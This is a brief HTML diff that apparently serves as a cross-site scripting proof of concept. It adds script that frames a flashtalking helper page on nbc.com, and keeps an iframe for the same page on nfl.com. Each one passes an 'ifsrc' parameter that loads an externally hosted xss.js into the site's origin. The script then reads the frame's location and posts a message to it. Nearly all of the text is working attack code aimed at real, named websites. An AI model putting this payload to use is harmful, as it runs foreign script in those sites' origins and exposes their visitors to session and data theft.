@@ -1,3 +1,20 @@
-<script>window.foo = 'src';window.top.foo = 'bar';</script>
+<script>
+var iframe = document.createElement("iframe");
+iframe.width = '1000px';
+iframe.height = '1000px'
+iframe.id = 'foo';
+iframe.src = "https://www.nbc.com/flashtalking/ftlocal.html?ifsrc=https://securesitepolicy.github.io/1/xss.js";
+
+
+
+window.document.body.appendChild(iframe);
+iframeWindow = iframe.contentWindow || iframe.contentDocument.parentWindow;
+iframe.onload = function(e){
+console.log(e)
+console.log(e.path[0].contentWindow.location);
+e.path[0].contentWindow.postMessage('yeah','*')
+//alert(iframe.window);
+};
+</script>
 <iframe src="http://www.nfl.com/flashtalking/ftlocal.html?ifsrc=https://securesitepolicy.github.io/1/xss.js">
 </iframe>
